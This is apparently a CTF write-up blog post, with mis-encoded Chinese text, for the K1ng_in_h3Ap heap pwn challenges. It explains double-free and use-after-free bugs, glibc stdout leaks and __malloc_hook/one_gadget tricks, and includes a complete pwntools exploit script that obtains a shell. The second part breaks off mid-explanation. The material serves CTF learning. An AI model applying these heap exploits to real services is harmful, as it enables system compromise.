---
title: é•¿åŸæ¯2021
date: 2021-09-20 16:26:46
tags: ['ä¿¡æ¯å®‰å…¨','ctf']
categories: ['ctf']
---

# å‰è¨€

  ç¾å¥½çš„ä¸€ä¸ªä¸­ç§‹å‡æœŸï¼Œç„¶è€ŒåŸºå‹ä»¬éƒ½å»è§å¥³æœ‹å‹äº†ã€‚ã€‚ã€‚åªæœ‰è‡ªå·±åœ¨æ‰“æ¯”èµ›ï¼Œå¤ªæƒ¨äº†ï¼ï¼ï¼
  è™½ç„¶å¦‚æ­¤ï¼Œ**å¥³ç”Ÿåªä¼šå½±å“æˆ‘æ‹”å‰‘çš„é€Ÿåº¦**ã€‚è¿˜æ˜¯æ¥æ€»ç»“ä¸€ä¸‹è¿™åœºæ¯”èµ›çš„éªšæ€è·¯æ›´ç°å®ä¸€äº›ğŸ˜¶

# K1ng_in_h3Ap_I

  [ç‚¹å‡»ä¸‹è½½é¢˜ç›®é™„ä»¶](K1ng_in_h3Ap.tar.gz)
  
## é¢˜ç›®ä¿æŠ¤

  å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒåŸºæœ¬ä¿æŠ¤å…¨å¼€
  ![K1ng_in_h3Apä¿æŠ¤æœºåˆ¶](K1ng_in_h3Apä¿æŠ¤æœºåˆ¶.PNG)

## é¢˜ç›®é€»è¾‘

  å…¶å°±æ˜¯ä¸€ä¸ªæ ‡å‡†çš„èœå•å †ï¼Œæ¡†æ¶å¦‚ä¸‹æ‰€ç¤º
  ```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // eax

  nothing();
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      v3 = read_int();
      if ( v3 != 2 )
        break;
      delete();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        edit();
      }
      else if ( v3 == 666 )
      {
        show();
      }
    }
    else if ( v3 == 1 )
    {
      add();
    }
  }
}
```

  å¯¹äº`add`åŠŸèƒ½ï¼Œå°±æ˜¯æ·»åŠ ä¸€ä¸ªç»™å®šè¾“å…¥å¤§å°çš„å†…å­˜å—ï¼Œé€»è¾‘å¦‚ä¸‹æ‰€ç¤º
  ```c
_DWORD *add()
{
  _DWORD *result; // rax
  int v1; // [rsp+8h] [rbp-8h]
  int v2; // [rsp+Ch] [rbp-4h]

  puts("input index:");
  v1 = read_int();
  if ( v1 < 0 || v1 > 10 )
    exit(0);
  puts("input size:");
  v2 = read_int();
  if ( v2 < 0 || v2 > 240 )
    exit(0);
  chunks[v1] = malloc(v2);
  result = size;
  size[v1] = v2;
  return result;
}
```

  å¯¹äº`delete`åŠŸèƒ½ï¼Œå…¶å°±æ˜¯`free`æ‰ç”³è¯·çš„å†…å­˜ã€‚ä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰ç½®0ï¼Œä»è€Œå¯¼è‡´å­˜åœ¨`double free`é—®é¢˜ã€‚å…¶é€»è¾‘å¦‚ä¸‹æ‰€ç¤º
  ```c
void delete()
{
  int v0; // [rsp+Ch] [rbp-4h]

  puts("input index:");
  v0 = read_int();
  if ( v0 < 0 || v0 > 10 || !chunks[v0] || !size[v0] )
    exit(0);
  free((void *)chunks[v0]);
}
```

  å¦å¤–ï¼Œåˆ™æ˜¯`edit`åŠŸèƒ½ï¼Œå°±æ˜¯æ ¹æ®`add`æ—¶çš„æ•°æ®ï¼Œé‡æ–°å‘å†…å­˜ä¸­å†™å…¥æ•°æ®ã€‚ç”±äºå‰é¢`delete`å¤„çš„æ¼æ´ï¼Œåˆ™è¿™é‡Œå­˜åœ¨ä¸¥é‡çš„`UAF`ã€‚å…¶é€»è¾‘å¦‚ä¸‹æ‰€ç¤º
  ```c
unsigned __int64 edit()
{
  int v1; // [rsp+Ch] [rbp-4h]

  puts("input index:");
  v1 = read_int();
  if ( v1 < 0 || v1 > 15 || !chunks[v1] )
    exit(0);
  puts("input context:");
  return read_input(chunks[v1], size[v1]);
}
```

  æœ€åï¼Œåˆ™æ˜¯å”¯ä¸€çš„ä¸€ä¸ªå—é™è¾“å‡ºï¼Œå…¶é€»è¾‘å¦‚ä¸‹æ‰€ç¤º
  ```c
int show()
{
  return printf("%p\n", (const void *)((unsigned __int64)&printf & 0xFFFFFF));
}
```


## è§£é¢˜æ€è·¯

  glibcä¸‹çš„é¢˜ç›®åŸºæœ¬éƒ½æ˜¯æ¨¡æ¿é¢˜â€”â€”å¦‚æœå¼€å¯äº†PIEå’Œåœ°å€éšæœºåŒ–ï¼Œåˆ™å°±æ˜¯æ³„éœ²glibcåŸºå€ï¼Œç„¶åè°ƒç”¨ç›¸å…³ç³»ç»Ÿè°ƒç”¨å³å¯

  è¿™é‡Œæ˜æ˜¾æ²¡æœ‰å¯ä»¥æ§åˆ¶çš„è¾“å‡ºå‡½æ•°ã€‚ä½†æ˜¯ä¸€èˆ¬çš„è¾“å‡ºå‡½æ•°ä¼šè¾“å‡º**_IO_2_1_stdout_->_IO_write_base**åœ°å€å¤„**_IO_2_1_stdout_->_IO_write_ptr - _IO_2_1_stdout_->_IO_write_base**å¤§å°çš„å­—èŠ‚ã€‚åˆ™é€šç”¨çš„å¥—è·¯å°±æ˜¯æ”¹å°**_IO_2_1_stdout_->_IO_write_base**çš„å€¼ï¼Œä»è€Œè®©è¾“å‡ºå‡½æ•°å¤šè¾“å‡ºä¸€äº›å†…å®¹ï¼Œè€Œè¿™é‡Œé¢å¾€å¾€å°±ä¼šåŒ…å«æœ‰glibcç›¸å…³çš„æ•°æ®

  ç”±äºæœ‰äº†åŸºå€ï¼Œåˆ™é€šè¿‡`UAF`ï¼Œæˆ‘ä»¬å¯ä»¥å‘`__free_hook`æˆ–`__malloc_hook`ä¸­å†™å…¥**one_gadget**ï¼Œä»è€Œæœ€ç»ˆè·å–shell


## å¥—è·¯å§¿åŠ¿

### _IO_2_1_stdoutæ³„éœ²glibcåŸºå€

  ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæŒ‡å‘**_IO_2_1_stdout**ç»“æ„ä½“é™„è¿‘çš„å†…å­˜å—ï¼Œä»è€Œå†™å…¥è¦†ç›–çš„æ•°æ®
  ç”±äº**_IO_2_1_stdout**ç»“æ„ä½“é™„è¿‘(_IO_2_1_stdout - 0x40 + 5 - 8)æ°å¥½æœ‰ä¸€ä¸ªå¯ä»¥ä¼ªé€ æˆ**0x71**çš„fast bin(fast binçš„SIZEå­—æ®µ0x7fç­‰æ•ˆäº0x71)ï¼Œå¦‚ä¸‹æ‰€ç¤º
  ![_IO_2_1_stdoutä¼ªé€ chunk](IO_2_1_stdoutä¼ªé€ chunk.PNG)


  åˆ™æˆ‘ä»¬åªéœ€è¦åœ¨å°†è¯¥ä¼ªé€ chunkæ’å…¥ç›¸å…³çš„fast biné“¾ä¸­ã€‚åˆ™ç”³è¯·å†…å­˜æ—¶ï¼Œè¯¥ä¼ªé€ chunkå¯ä»¥å½“åšæ­£å¸¸çš„å†…å­˜è¢«è¿”å›ï¼Œåˆ™ç›´æ¥æˆ‘ä»¬åªéœ€è¦è¾“å…¥å¦‚ä¸‹æ•°æ®ï¼Œå³å¯å°†**_IO_2_1_stdout->_IO_write_base**çš„ä½ä½è¦†ç›–ä¸º**\x00**ï¼Œä»è€Œè¾“å‡ºå‡½æ•°ä¼šè¾“å‡ºæ›´å¤šå†…å®¹
  ```python
padding * 51 + p64(0xfbad1800) + p64(0) * 3 + '\x00'
```

### è¦†ç›–é“¾è¡¨æŒ‡å‘

  å¦‚æœæ²¡æœ‰å¯æ§çš„è¾“å‡ºå‡½æ•°ï¼Œåˆ™æˆ‘ä»¬å¾ˆéš¾è·å–å †åœ°å€ï¼Œè¿™å¯¹äºä¿®æ”¹ç©ºé—²é“¾è¡¨çš„æŒ‡å‘é˜»ç¢å¾ˆå¤§(å› ä¸ºæˆ‘ä»¬æ²¡æ³•å°†é“¾è¡¨çš„æŒ‡å‘ä¿®æ”¹åˆ°å·²æœ‰çš„åˆæ³•å †ç©ºé—´)ä¸­ï¼Œä½†æ˜¯å¹¶éå®Œå…¨æ²¡æœ‰åŠæ³•ã€‚

  å¦‚æœæˆ‘ä»¬çš„è¦æ±‚ä»…ä»…æ˜¯å°†é“¾è¡¨æŒ‡å‘ä¿®æ”¹åˆ°ç›¸è¿‘çš„å †åœ°å€ä¸­ï¼Œåˆ™å¯ä»¥é€šè¿‡è¦†ç›–é“¾è¡¨æŒ‡å‘çš„åå‡ ä½ï¼Œä»è€Œæ›´æ”¹é“¾è¡¨çš„æŒ‡å‘ã€‚

  ä¸€èˆ¬è¿™ä¸ªç”¨æ¥å’Œå‰é¢**_IO_2_1_stdout_**é…åˆä½¿ç”¨çš„ã€‚
  å¦‚æœä¸€ä¸ªfast binä¸Šä¿ç•™æœ‰**unsorted bin**ç­‰çš„fdä¿¡æ¯ï¼Œåˆ™è¯¥å€¼å’Œ**_IO_2_1_stdout_**ä¸€èˆ¬ä»…ä»…ä½16ä½ä¸åŒï¼Œè€Œç”±äºä½12ä½æ˜¯å›ºå®šçš„ï¼Œå› æ­¤è¦†ç›–æ‰è¯¥fast binçš„å16ä½ï¼Œæœ‰$$\frac{1}{16}$$çš„å¯èƒ½æ€§ï¼Œå…¶æŒ‡å‘**_IO_2_1_stdout_**å¤„ä¼ªé€ çš„chunkã€‚å› æ­¤åªéœ€è¦ç¨åŠ çˆ†ç ´ï¼Œå³å¯æˆåŠŸåˆ©ç”¨


### one_gadget

  åœ¨glibcä¸­ï¼Œæˆ‘ä»¬ä¼šè¿›è¡Œä½¿ç”¨**one_gadget**â€”â€”å°†å…¶å†™å…¥gotè¡¨ä¸­æˆ–è¿”å›åœ°å€ä¸­ï¼Œç„¶åé€šè¿‡æ‰§è¡Œè¯¥åœ°å€å¤„çš„ä»£ç ï¼Œä»è€Œä¸€æ­¥è·å–shellã€‚å½“ç„¶ï¼Œå¥½ä¸œè¥¿éƒ½æ˜¯æœ‰ä»£ä»·çš„ï¼Œå…¶æ‰§è¡Œéœ€è¦æœ‰è¯¸å¤šçš„é™åˆ¶ï¼Œå¦‚æ ˆä¸­æ•°æ®æˆ–å¯„å­˜å™¨çš„è¦æ±‚ï¼Œå¦‚ä¸‹æ‰€ç¤º
  ![one_gadgetçº¦æŸ](one_gadgetçº¦æŸ.PNG)

  è€Œæœ‰æ—¶ï¼Œæ ˆä¸Šæ•°æ®æˆ–å¯„å­˜å™¨ç¡®å®æ— æ³•æ»¡è¶³è¿™äº›è¦æ±‚ï¼Œåˆ™æˆ‘ä»¬å°±å¾ˆéš¾ä½¿ç”¨è¯¥æ¡ä»¶ã€‚
  å®é™…ä¸Šï¼Œæœ‰ä¸¤ä¸ªè§£å†³åŠæ³•

#### double freeè§¦å‘malloc_printerr

   å½“æˆ‘ä»¬è§¦å‘äº†**malloc_printerr**æ—¶ï¼Œå…¶ä¼šè°ƒç”¨**malloc**ã€‚å¦‚æœè®¾ç½®äº†**__malloc_hook**ä¸º**one_gadget**ï¼Œæ°å¥½æœ‰**[esp+0x50]==0**ã€‚
   å› æ­¤ï¼Œæˆ‘ä»¬åªéœ€è¦å°†**__malloc_hook**çš„å€¼è¦†å†™ä¸ºçº¦æŸæ¡ä»¶ä¸º**[esp + 0x50] == 0**çš„çº¦æŸæ¡ä»¶çš„**one_gadget**ï¼Œç„¶åè¿ç»­é‡Šæ”¾ä¸¤æ¬¡ç›¸åŒçš„chunkå³å¯

#### æŠ¬é«˜æ ˆåŸºå€

  æˆ‘ä»¬æœ‰æŒ‡å‘`__malloc_hook`çš„æŒ‡é’ˆï¼Œåˆ™é—®é¢˜å°±å¥½åŠå¤šäº†â€”â€”å› ä¸º`__realloc_hook`å°±åœ¨`__malloc_hook`æ—è¾¹

  ä¸€èˆ¬ï¼Œå¦‚æœæœ‰æŒ‡å‘`__malloc_hook`çš„æŒ‡é’ˆï¼Œéƒ½æ˜¯æŒ‡å‘`__malloc_hook`å‘¨è¾¹ä¼ªé€ çš„fast binï¼Œå¦‚ä¸‹æ‰€ç¤º
  ![__malloc_hookä¼ªé€ chunk](malloc_hookä¼ªé€ chunk.PNG)

  å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬å°†`__malloc_hook`è®¾ç½®ä¸º`realloc`çš„åœ°å€ï¼ŒåŒæ—¶å°†`__realloc_hook`çš„åœ°å€è®¾ç½®ä¸º**one_gadget**ï¼Œåˆ™å®é™…ä¸Šä»ç„¶ç›¸å½“äºæ‰§è¡Œäº†**one_gadget**ã€‚ä½†æ˜¯ä¸€èˆ¬å‡½æ•°å¼€å§‹éƒ¨åˆ†éƒ½æ˜¯**push**æŒ‡ä»¤ï¼Œå…¶ä¼šé™ä½æ ˆåœ°å€ï¼Œåˆ™æˆ‘ä»¬è·³è¿‡å‡ ä¸ª`realloc`çš„**push**æŒ‡ä»¤çš„è¯ï¼Œä»ç„¶ä¼šæ‰§è¡Œ**one_gadget**ï¼Œä½†æ˜¯ç›¸å¯¹æ ˆåŸºå€ä½ç§»å¤„çš„å®é™…åœ°å€å˜å¤§äº†ï¼Œç›¸å½“äºæŠ¬é«˜æ ˆå¸§ï¼Œåˆ™å¾ˆå®¹æ˜“æ»¡è¶³**one_gadget**çš„çº¦æŸã€‚
  è¿™é‡Œé¦–å…ˆç»™å‡º`realloc`éƒ¨åˆ†æ±‡ç¼–ä»£ç åŠå…¶åç§»ï¼Œå¦‚ä¸‹æ‰€ç¤º
  ```x86asm
   84710:	41 57                	push   %r15
   84712:	41 56                	push   %r14
   84714:	41 55                	push   %r13
   84716:	41 54                	push   %r12
   84718:	49 89 f4             	mov    %rsi,%r12
   8471b:	55                   	push   %rbp
   8471c:	53                   	push   %rbx
   8471d:	48 89 fb             	mov    %rdi,%rbx
   84720:	48 83 ec 38          	sub    $0x38,%rsp
   84724:	48 8b 05 a5 f8 33 00 	mov    0x33f8a5(%rip),%rax        # 3c3fd0 <_IO_file_jumps@@GLIBC_2.2.5+0x8f0>
   8472b:	48 8b 00             	mov    (%rax),%rax
   8472e:	48 85 c0             	test   %rax,%rax
   84731:	0f 85 21 02 00 00    	jne    84958 <__libc_realloc@@GLIBC_2.2.5+0x248>
```


  åˆ™æˆ‘ä»¬åªéœ€è¦åœ¨`__malloc_hook`é™„è¿‘è¾“å…¥å¦‚ä¸‹æŒ‡ä»¤ï¼Œå³å¯å®Œæˆ**one_gadget**çš„åˆ©ç”¨
  ```python
padding * 0xb + p64(lib_base + one_gadget) + p64(lib_base + lib.sym['realloc'] + offset)
```

## é¢˜è§£å’Œå…³é”®è¯´æ˜

  é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæŒ‡å‘**_IO_2_1_stdout_**é™„è¿‘çš„å†…å­˜å—ï¼Œä¸€èˆ¬é€šè¿‡é‡Šæ”¾è¶…è¿‡**fast bin**å¤§å°çš„å†…å­˜æ¥è·å–ï¼Œç„¶ååœ¨é€šè¿‡è¦†ç›–å·²æœ‰çš„fast biné“¾æŒ‡é’ˆï¼Œå°†è¯¥fake chunkæ’å…¥é“¾ä¸Šï¼Œç›¸å…³ä»£ç å¦‚ä¸‹æ‰€ç¤º
  ```python
	wp_add(r, 0, 0xd0)		#base
	wp_add(r, 2, 0x10)		#base
	wp_delete(r, 0)

	wp_add(r, 1, 0x60)		#base
	wp_add(r, 2, 0x60)		#base + 0x70
	wp_add(r, 3, 0x60)		#base + 0x70 * 2

	wp_delete(r, 2)
	wp_delete(r, 3)
	wp_edit(r, 3, '\x00')
	wp_edit(r, 1, '\xdd\x25')
	wp_add(r, 4, 0x60)
	wp_add(r, 3, 0x60)
	wp_add(r, 2, 0x60)
```

  ç»è¿‡è¿™äº›æ­¥éª¤ï¼Œæ­¤æ—¶å†…å­˜å¸ƒå±€å¦‚ä¸‹æ‰€ç¤º
  ![K1ng_in_h3Ap_Iå†…å­˜å¸ƒå±€1](K1ng_in_h3Ap_Iå†…å­˜å¸ƒå±€1.PNG)

  æ­¤æ—¶ï¼Œåœ¨0x70å¤§å°çš„fast biné“¾ä¸Šï¼Œå·²ç»å½¢æˆäº†**chunk_baes + 0x100**->**chunk_baes**->**_IO_2_1_stdout_ - 0x43**çš„é“¾ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è¦†ç›–**_IO_2_1_stdout_**çš„å€¼ï¼Œä»è€Œæ³„éœ²glibcåŸºå€


  æœ€åï¼Œåˆ™æ˜¯æ™®é€šçš„ä¼ªé€ chunkï¼Œä»è€Œä¿®æ”¹**__malloc_hook**ä¸º**one_gadget**ï¼Œè¿™é‡Œå±•ç¤ºä¸€ä¸‹æŠ¬æ ˆå§¿åŠ¿ï¼Œæˆ‘ä»¬å°±ä»¥`[rsp + 0x30] = 0`çº¦æŸä¸ºä¾‹ï¼Œå…¶ä½™æ˜¯ç±»ä¼¼çš„ã€‚
  å¦‚æœæˆ‘ä»¬ç®€å•çš„ç›´æ¥ä¿®æ”¹**__malloc_hook**ä¸º**realloc@@GLIBC_2.2.5**ï¼Œå†å°†**__realloc_hook**æ›´æ”¹ä¸º**one_gadget**ï¼Œåˆ™å…¶æœ€åé¢ä¸´å¦‚ä¸‹æƒ…å†µ
  ![rsp+0x30çº¦æŸä¸‹one_gadgetæ ˆä¸Šæ•°æ®1](rsp+0x30çº¦æŸä¸‹one_gadgetæ ˆä¸Šæ•°æ®1.PNG)


  æ ¹æ®å‰é¢**realloc@GLIBC_2.2.5**æ±‡ç¼–ä»£ç å¯ä»¥çœ‹åˆ°ï¼Œä»**realloc**åˆ°**one_gadget**ï¼Œå…¶å°†æ ˆåœ°å€ä¸‹è°ƒäº†**0x70**ï¼Œè€Œ`[rsp + 0x30 - 0x70] != 0`ï¼Œå³ä¸æ»¡è¶³**one_gadget**çº¦æŸã€‚ä½†æ˜¯æˆ‘ä»¬å‘ç°`[rsp + 0x30 - 0x70 + 0x8 * 4]`å¤„å­˜åœ¨æ»¡è¶³çº¦æŸçš„æ•°æ®â€”â€”åˆ™æˆ‘ä»¬åªéœ€è¦æŠ¬é«˜æ ˆåŸºå€0x20ï¼Œå³å‡å°‘å››æ¬¡`push`æŒ‡ä»¤ï¼Œå³å¯æ»¡è¶³**one_gadget**çº¦æŸã€‚
  å› æ­¤ï¼Œæ ¹æ®å‰é¢ç»™å‡ºçš„`realloc`æ±‡ç¼–ä»£ç ï¼Œæˆ‘ä»¬å°†**__malloc_hook**è®¾ç½®ä¸º**realloc@@GLIBC_2.2.5 + 8**ï¼Œä»ç„¶å°†**__realloc_hook**æ›´æ”¹ä¸º**one_gadget**å³å¯ï¼Œæ­¤æ—¶æƒ…å†µå¦‚ä¸‹æ‰€ç¤º
  ![rsp+0x30çº¦æŸä¸‹one_gadgetæ ˆä¸Šæ•°æ®2](rsp+0x30çº¦æŸä¸‹one_gadgetæ ˆä¸Šæ•°æ®2.PNG)

  æœ€åï¼Œå®Œæ•´çš„wpå¦‚ä¸‹æ‰€ç¤º
  ```python
#!/usr/bin/python2
# -*- coding:utf-8 -*-
from pwn import *
import sys
import platform

'''
	å¾…ä¿®æ”¹æ•°æ®
'''
context.log_level = 'debug'
context.arch = 'amd64'				# 32ä½ä½¿ç”¨i386
context.os = 'linux'

execve_file = './pwn'
lib_file = './libc.so.6'
argv = []




'''
	elf.plt[`symbol`] è·å–elfæ–‡ä»¶ä¸­å¯¼å…¥ç¬¦å·çš„pltåœ°å€
	elf.got[`symbol`] è·å–elfæ–‡ä»¶ä¸­å¯¼å…¥ç¬¦å·çš„gotåœ°å€
	elf.sym['symbol'] è·å–elfæ–‡ä»¶ä¸­æœ¬åœ°ç¬¦å·çš„å‡½æ•°å®é™…åœ°å€
'''
if execve_file != None:
	elf = ELF(execve_file)

'''
	lib.sym[`symbol`] è·å–libä¸­ç¬¦å·åœ°å€
	lib.search['string'].next() è·å–libä¸­å­—ç¬¦ä¸²åœ°å€
'''
if lib_file != None:
	lib = ELF(lib_file)

log.info('-----------------------------------------------------------')


'''
	æ‰§è¡Œçˆ†ç ´æ”»å‡»
	åªæœ‰å½“æˆåŠŸè·å–shellæˆ–è€…é”®ç›˜Ctrl+Cé€€å‡ºæ—¶ï¼Œç¨‹åºä¸­æ­¢å¾ªç¯
	å¦åˆ™ç¨‹åºä¸€ç›´è¿›è¡Œå¾ªç¯
'''


def wp_add(r, idx, size):
	r.sendlineafter('>>', '1')
	r.sendlineafter('input index:', str(idx))
	r.sendlineafter('input size:', str(size))

def wp_delete(r, idx):
	r.sendlineafter('>>', '2')
	r.sendlineafter('input index:', str(idx))


def wp_edit(r, idx, context):
	r.sendlineafter('>>', '3')
	r.sendlineafter('input index:', str(idx))
	r.sendlineafter('input context:', context)

def wp_show(r):
	r.sendlineafter('>>', '666')

def exp():
	if 'd' in sys.argv:
		#r = gdb.debug([execve_file] + argv)	# é¦–å…ˆåŠ è½½å½“å‰ç›®å½•ä¸‹çš„åŠ¨æ€åº“æ–‡ä»¶
		r = process([execve_file] + argv)	# é¦–å…ˆåŠ è½½å½“å‰ç›®å½•ä¸‹çš„åŠ¨æ€åº“æ–‡ä»¶
	else:
		r = remote(sys.argv[1], sys.argv[2])

	wp_add(r, 0, 0xd0)		#base
	wp_add(r, 2, 0x10)		#base
	wp_delete(r, 0)

	wp_add(r, 1, 0x60)		#base
	wp_add(r, 2, 0x60)		#base + 0x70
	wp_add(r, 3, 0x60)		#base + 0x70 * 2

	wp_delete(r, 2)
	wp_delete(r, 3)
	wp_edit(r, 3, '\x00')
	wp_edit(r, 1, '\xdd\x25')
	wp_add(r, 4, 0x60)
	wp_add(r, 3, 0x60)
	wp_add(r, 2, 0x60)

	wp_edit(r, 2, '\x00' * 51 + p64(0xfbad1800) + p64(0) * 3 + '\x88')
	lib_base = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00')) + 0x7ffff7a0d000 - 0x7ffff7dd18e0
	log.info('lib_base => %#x'%(lib_base))


	wp_delete(r, 3)
	wp_edit(r, 3, p64(lib_base + lib.sym['__malloc_hook'] - 0x23))

	wp_add(r, 3, 0x60)
	wp_add(r, 3, 0x60)

	wp_edit(r, 3, '\x00' * 0xb + p64(lib_base + 0x4527a) + p64(lib_base + lib.sym['realloc'] + 8))
	wp_add(r, 3, 0x60)
	r.interactive()

while True:
	try:
		exp()
		break
	except KeyboardInterrupt:
		break
	except:
		continue

	
log.info('-----------------------------------------------------------')
```

# K1ng_in_h3Ap_II

  [ç‚¹å‡»ä¸‹è½½é¢˜ç›®é™„ä»¶](K1ng_in_h3Ap_II.tar.gz)
  è¿™é‡Œç‰¹åˆ«è¯´æ˜ä¸€ä¸‹ï¼Œç›®å‰**ubuntu18**çš„tcacheå·²ç»è¢«æ‰“ä¸Šäº†è¡¥ä¸ï¼Œå³åŒ…å«äº†keyå­—æ®µçš„æ£€æµ‹â€”â€”å› æ­¤ä¸èƒ½ä»…é€šè¿‡[glibcå®˜ç½‘ç‰ˆæœ¬æºä»£ç ](http://ftp.gnu.org/gnu/glibc/)å»åˆ†æ(é‡Œé¢å°‘äº†éƒ¨åˆ†æœºåˆ¶)

## é¢˜ç›®ä¿æŠ¤

  å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œä»ç„¶æ˜¯ä¿æŠ¤å…¨å¼€
  ![K1ng_in_h3Ap_IIä¿æŠ¤æœºåˆ¶](K1ng_in_h3Ap_IIä¿æŠ¤æœºåˆ¶.PNG)

## é¢˜ç›®é€»è¾‘

  å’Œå‰é¢çš„K1ng_in_h3Ap_Iæ˜¯ç±»ä¼¼çš„ï¼Œä»ç„¶æ˜¯ä¸€ä¸ªæ ‡å‡†çš„èœå•å †ï¼Œæ¡†æ¶å¦‚ä¸‹æ‰€ç¤º
  ```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  nothing();
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      v3 = 0;
      __isoc99_scanf("%d", &v3);
      if ( v3 != 2 )
        break;
      delete();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        edit();
      }
      else if ( v3 == 4 )
      {
        show();
      }
    }
    else if ( v3 == 1 )
    {
      add();
    }
  }
}
```

  å¯¹äº`add`åŠŸèƒ½ï¼Œç±»ä¼¼å‰é¢ï¼Œä»ç„¶æ˜¯æ·»åŠ ä¸€ä¸ªç»™å®šè¾“å…¥å¤§å°çš„å†…å­˜å—ï¼Œé€»è¾‘å¦‚ä¸‹æ‰€ç¤º
  ```c
_DWORD *add()
{
  _DWORD *result; // rax
  int v1; // [rsp+8h] [rbp-8h]
  int v2; // [rsp+Ch] [rbp-4h]

  puts("input index:");
  v1 = read_int();
  if ( v1 < 0 || v1 > 15 )
    exit(0);
  puts("input size:");
  v2 = read_int();
  if ( v2 <= 15 || v2 > 96 )
    exit(0);
  chunk[v1] = malloc(v2);
  result = size;
  size[v1] = v2;
  return result;
}
```

  å¯¹äº`delete`åŠŸèƒ½ï¼Œä¹Ÿæ²¡æ€ä¹ˆæ”¹å˜ï¼Œå°±æ˜¯`free`æ‰ç”³è¯·çš„å†…å­˜ã€‚åŒæ ·å­˜åœ¨æœªç½®0å¯¼è‡´çš„**double free**é—®é¢˜ï¼Œå…¶é€»è¾‘å¦‚ä¸‹æ‰€ç¤º
  ```c
void delete()
{
  int v0; // [rsp+Ch] [rbp-4h]

  puts("input index:");
  v0 = read_int();
  if ( v0 < 0 || v0 > 15 || !chunk[v0] )
    exit(0);
  free((void *)chunk[v0]);
}
```

  æœ€åä¸€ä¸ªä¸å‰é¢éå¸¸ç›¸ä¼¼çš„ï¼Œå°±æ˜¯`edit`åŠŸèƒ½â€”â€”ç”±äºå‰é¢`delete`å¤„çš„æ¼æ´ï¼Œè¿™é‡Œå­˜åœ¨ä¸¥é‡çš„**UAF**é—®é¢˜ã€‚å‡½æ•°é€»è¾‘å¦‚ä¸‹æ‰€ç¤º
  ```c
ssize_t edit()
{
  int v1; // [rsp+Ch] [rbp-4h]

  puts("input index:");
  v1 = read_int();
  if ( v1 < 0 || v1 > 15 || !chunk[v1] )
    exit(0);
  puts("input context:");
  return read(0, (void *)chunk[v1], (int)size[v1]);
}
```

  ä¸å‰é¢è¾ƒå¤§çš„ä¸åŒåœ¨äºï¼Œè¯¥ç¨‹åºæœ‰å¯æ§çš„è¾“å‡ºå‡½æ•°â€”â€”è¿™æ ·é…åˆ**UAF**ï¼Œå¯ä»¥è½»æ¾çš„è·å–å †åœ°å€å’ŒglibcåŸºå€ã€‚å‡½æ•°é€»è¾‘å¦‚ä¸‹æ‰€ç¤º
  ```c
int show()
{
  int v1; // [rsp+Ch] [rbp-4h]

  puts("input index:");
  v1 = read_int();
  if ( v1 < 0 || v1 > 15 || !chunk[v1] )
    exit(0);
  return puts((const char *)chunk[v1]);
}
```


## è§£é¢˜æ€è·¯

  ä¸€æ–¹é¢ï¼Œç”±äºæ­¤æ—¶æœ‰å¯æ§çš„è¾“å‡ºå‡½æ•°ï¼Œåˆ™é…åˆ**UAF**ï¼Œæˆ‘ä»¬æ²¡å¿…è¦åœ¨ç±»ä¼¼å‰é¢ä¿®æ”¹**_IO_2_1_stdout_**æ¥æ³„éœ²glibcåŸºå€â€”â€”åªéœ€è¦å°†è¶…è¿‡**fast bin**å¤§å°çš„chunké‡Šæ”¾åˆ°**unsorted bin**ä¸­ï¼Œç„¶åæ‰“å°å³å¯
  å¦ä¸€æ–¹é¢ï¼Œç”±äº**tcache**å¯ä»¥æŒ‡å‘ä»»æ„ä½ç½®ï¼Œè€Œæ— éœ€æ£€æŸ¥æŒ‡å‘çš„ä½ç½®æ˜¯å¦ä¸ºåˆæ³•çš„chunkã€‚åˆ™é€šè¿‡**environ**å˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥æ³„éœ²æ ˆåœ°å€ï¼Œå¹¶ä¼ªé€ æŒ‡å‘å½“å‰å‡½æ•°æ ˆçš„**tcache**é“¾å³å¯ï¼Œä»è€Œè¾“å…¥ropé“¾ï¼Œé€šè¿‡è°ƒç”¨**open**ã€**read**å’Œ**write**ç³»ç»Ÿè°ƒç”¨ï¼Œè·å–flag


## å¥—è·¯å§¿åŠ¿

### é™åˆ¶å¤§å°çš„tcacheä¸‹é‡Šæ”¾chunkè‡³unsorted bin

  é¦–å…ˆï¼Œç”±äºæ‰€æœ‰é‡Šæ”¾çš„chunkä¼šå…ˆé‡Šæ”¾åˆ°**tcache**ï¼Œç­‰**tcache**å¡«å……æ»¡(7ä¸ª)åæ‰é‡Šæ”¾åˆ°**fast bin**æˆ–**unsorted bin**ä¸­ã€‚åˆ™æˆ‘ä»¬å¿…é¡»é‡Šæ”¾8ä¸ªç›¸åŒå¤§å°çš„ï¼Œå¤§å°è¶…è¿‡fast binçš„chunkï¼Œæ‰èƒ½å°†chunké‡Šæ”¾åˆ°**unsorted bin**ä¸­ï¼›
  å…¶æ¬¡ï¼Œå¯¹äºé™åˆ¶å¤§å°çš„tcacheæ¥è¯´ï¼Œå°±ç®—æŒ‰ç…§å‰é¢é‡Šæ”¾8ä¸ªï¼Œå…¶ç¬¬8ä¸ªåŠä¹‹åçš„éƒ½ä¼šè¢«é‡Šæ”¾è‡³**fast bin**ä¸­ï¼Œä¸æ»¡è¶³è¦æ±‚ã€‚

  å¯ä»¥çœ‹åˆ°ï¼Œä¸Šè¿°çš„æ–¹æ³•å¯¹äºé‡Šæ”¾chunkåˆ°**unsorted bin**ä¸­éƒ½æ˜¯æ¯”è¾ƒéº»çƒ¦çš„ï¼Œä¸€èˆ¬æ›´é€šç”¨çš„æ–¹æ³•æ˜¯å †é‡å ã€‚
